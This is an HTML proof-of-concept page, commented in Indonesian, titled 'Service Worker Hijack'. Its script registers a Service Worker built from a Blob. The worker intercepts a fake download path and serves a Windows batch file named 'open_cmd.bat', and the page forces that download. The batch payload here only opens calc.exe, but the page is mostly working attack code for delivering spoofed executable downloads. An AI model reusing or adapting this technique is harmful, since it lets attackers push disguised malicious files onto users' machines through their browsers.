<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Service Worker Hijack (Unique Function)</title>
    <style>
        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; background: #000; color: #0f0; }
        button { width: 100%; padding: 15px; margin-bottom: 12px; border: 2px solid #0f0; border-radius: 6px; font-weight: bold; cursor: pointer; background: #000; color: #0f0; font-size: 14px; transition: 0.2s; }
        button:hover { background: #0f0; color: #000; }
        #log { background: #111; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 200px; overflow-y: auto; margin-top: 10px; border: 1px solid #333; }
    </style>
</head>
<body>

    <h2>🔥 Service Worker Hijack 🔥</h2>
    <p style="font-size: 13px; color: #888;">Manipulasi Header via Client-Side (Tanpa API Server)</p>

    <button onclick="triggerSW()">⚡ Eksekusi Service Worker Hack</button>

    <pre id="log">Menunggu perintah...</pre>

    <script>
        function log(msg) {
            const el = document.getElementById('log');
            el.textContent += '\n> ' + msg;
            el.scrollTop = el.scrollHeight;
        }

        // KONTEN FILE
        const BAT_TEXT = '@echo off\r\nstart "" "C:\\Windows\\System32\\calc.exe"\r\npause\r\n';

        async function triggerSW() {
            log('Memulai inisialisasi Service Worker...');

            // 1. Kita buat script Service Worker dalam bentuk Blob
            const swCode = `
                self.addEventListener('install', e => self.skipWaiting());
                self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
                
                self.addEventListener('fetch', event => {
                    // Intersepsi request khusus ke /fake-download
                    if (event.request.url.includes('/fake-download')) {
                        event.respondWith(new Response('${BAT_TEXT.replace(/\n/g, '\\n')}', {
                            status: 200,
                            headers: {
                                'Content-Type': 'application/octet-stream',
                                'Content-Disposition': 'attachment; filename="open_cmd.bat"'
                            }
                        }));
                    }
                });
            `;

            const blob = new Blob([swCode], { type: 'application/javascript' });
            const swUrl = URL.createObjectURL(blob);

            try {
                log('Mendaftarkan Service Worker...');
                const reg = await navigator.serviceWorker.register(swUrl);
                log('✅ Service Worker Aktif!');

                // Tunggu SW siap
                await navigator.serviceWorker.ready;
                
                log('Memicu intercept download...');
                // 2. Panggil URL yang akan dicegat oleh SW
                const a = document.createElement('a');
                // Kita pakai path palsu yang akan ditangkap SW
                a.href = '/fake-download?t=' + Date.now(); 
                a.download = 'open_cmd.bat'; // Ini memaksa download
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);

                log('👉 File berhasil dipalsukan isinya!');
                log('⚠️ TAPI, karena SOP, Firefox akan tetap menulis domain Anda di panel.');

            } catch (e) {
                log('❌ Gagal: ' + e.message);
                log('Pastikan Anda menjalankan ini di HTTPS atau localhost.');
            }
        }
    </script>
</body>
</html>
